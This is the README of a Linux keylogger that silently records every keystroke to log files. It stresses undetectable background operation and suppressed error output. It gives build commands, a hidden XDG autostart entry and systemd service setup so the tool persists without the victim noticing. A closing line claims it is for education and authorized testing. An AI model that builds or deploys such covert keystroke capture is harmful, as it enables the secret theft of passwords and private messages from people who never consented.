# Silent Keylogger for Linux

This is a completely silent keylogger that tracks every pressed key and writes it to a timestamped log file. When a mouse button or the Enter key is pressed, it creates a new line in the log file. The keylogger intelligently handles modifier keys (Shift, Caps Lock) to accurately log the correct characters as they would appear on screen.

## Features

- **Completely Silent Operation**: No console output or visible indicators during operation
- **Timestamped Log Files**: Creates log files named `keylog_YYYYMMDD_HHMMSS.txt` for each session
- **Intelligent Modifier Key Handling**: Properly tracks Shift, Caps Lock, and AltGr keys to log correct characters
- **Accurate Character Mapping**: Logs uppercase/lowercase letters and special symbols correctly based on keyboard state
- **Special Character Support**: Correctly handles shifted symbols (e.g., `@` when Shift+2 pressed, `_` when Shift+- pressed)
- **Mouse Event Detection**: Creates new lines when mouse buttons are clicked
- **Enter Key Recognition**: Creates new lines when Enter key is pressed
- **Invisible Background Operation**: Runs undetectably in the background
- **Cross-Distribution Compatibility**: Works on all major Linux distributions
- **Autostart Capability**: Can be added to Linux autostart applications
- **Robust Error Handling**: Handles errors silently without user notification

## Files Included

- `keylogger.c`: Source code for the keylogger
- `Makefile`: For compiling the keylogger
- `keylogger.service`: Systemd service file
- `install.sh`: Installation script
- `test_keylogger.sh`: Testing script
- `README.md`: This file

## Prerequisites

The keylogger requires the following packages to compile and run:
- `build-essential` (gcc compiler)
- `libinput-dev` (input device headers)
- Root access to read input devices

## Compilation

```bash
make
```

For systems without build-essential:
```bash
# Debian/Ubuntu
sudo apt-get install build-essential

# RHEL/CentOS/Fedora
sudo yum install gcc make
# or for newer Fedora
sudo dnf install gcc make

# Arch Linux
sudo pacman -S gcc make
```

## Manual Execution

```bash
./keylogger
```

Note: The program needs to run with sufficient privileges to access input devices. On most systems, this means running as root or having appropriate permissions.

## Adding to Autostart

### Method 1: Using the install script (recommended)

```bash
./install.sh
```

This will:
1. Install required dependencies based on your distribution
2. Compile the keylogger
3. Add it to your autostart applications

### Method 2: Manual addition to autostart

Create a desktop entry file in `~/.config/autostart/keylogger.desktop`:

```ini
[Desktop Entry]
Type=Application
Name=Keylogger
Exec=/full/path/to/keylogger
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
```

### Method 3: Using systemd service (for system-wide installation)

1. Copy the executable to `/usr/local/bin/`:
   ```bash
   sudo cp keylogger /usr/local/bin/
   sudo chmod +x /usr/local/bin/keylogger
   ```

2. Copy the service file to `/etc/systemd/system/`:
   ```bash
   sudo cp keylogger.service /etc/systemd/system/
   ```

3. Enable and start the service:
   ```bash
   sudo systemctl enable keylogger.service
   sudo systemctl start keylogger.service
   ```

## Distribution Compatibility

This keylogger is designed to work on all major Linux distributions:

- **Debian/Ubuntu**: Uses APT package manager
- **Red Hat/CentOS/Fedora**: Uses YUM/DNF package manager
- **Arch Linux**: Uses Pacman package manager
- **openSUSE**: Uses ZYPPER package manager
- **Gentoo**: Compatible with Portage

The installation script automatically detects your distribution and installs the appropriate dependencies.

## Log File Location

By default, the log file (`keylog_YYYYMMDD_HHMMSS.txt`) will be created in the same directory as the executable. You can customize this location by creating a `keylogger.conf` configuration file.

## Configuration

The keylogger can be configured using a `keylogger.conf` file in the same directory as the executable. The configuration file supports the following options:

- `log_directory`: Specify a custom directory for log files (leave empty or use '.' for executable directory)
- `dynamic_formatting`: Enable (1) or disable (0) dynamic SHIFT and CAPSLOG formatting

Example configuration file:
```
# Log Directory - Specify where log files should be stored
# Leave empty or use '.' to store in the same directory as the executable
# Example: /var/log/keylogger/ or /home/user/logs/
log_directory=

# Dynamic Formatting - Enable or disable dynamic SHIFT and CAPSLOG formatting
# Set to 1 to enable dynamic formatting (default behavior)
# Set to 0 to disable dynamic formatting (use basic character mapping)
dynamic_formatting=1
```

## Stopping the Keylogger

To stop the keylogger, find its process ID and kill it:

```bash
ps aux | grep keylogger
kill [PID]
```

Or if running as a systemd service:
```bash
sudo systemctl stop keylogger
```

## Testing

Run the test suite to verify functionality:

```bash
./test_keylogger.sh
```

## Security Considerations

- The program requires access to `/dev/input/event*` devices
- On most systems, this requires running as root or adding your user to the `input` group
- To add your user to the input group (not recommended for security):
  ```bash
  sudo gpasswd -a $USER input
  # Then log out and back in
  ```

## Troubleshooting

- If the program fails to detect input devices, ensure you have appropriate permissions
- If compilation fails, ensure build tools are installed
- If autostart doesn't work, check that your desktop environment supports XDG autostart

## Important Notes

- This tool requires root privileges to access input devices
- Use responsibly and in compliance with applicable laws
- The logged data contains sensitive information - handle securely
- This tool is intended for educational purposes and authorized penetration testing